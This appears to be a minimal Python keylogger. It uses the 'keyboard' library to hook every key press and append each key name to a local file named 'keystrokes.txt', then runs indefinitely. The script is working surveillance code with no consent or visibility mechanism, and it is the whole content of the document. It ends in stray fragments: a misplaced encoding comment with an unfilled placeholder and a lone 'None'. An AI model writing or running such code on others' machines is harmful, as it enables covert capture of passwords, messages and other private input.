import keyboard

log_file = "keystrokes.txt"  # saved file.


# write the keystrokes on file, and format one stroke per like
def on_key_press(event):
    with open(log_file, "a") as f:
        f.write("{}\n".format(event.name))


keyboard.on_press(on_key_press)

keyboard.wait()

# -*- coding: <encoding-name> -*- 

None
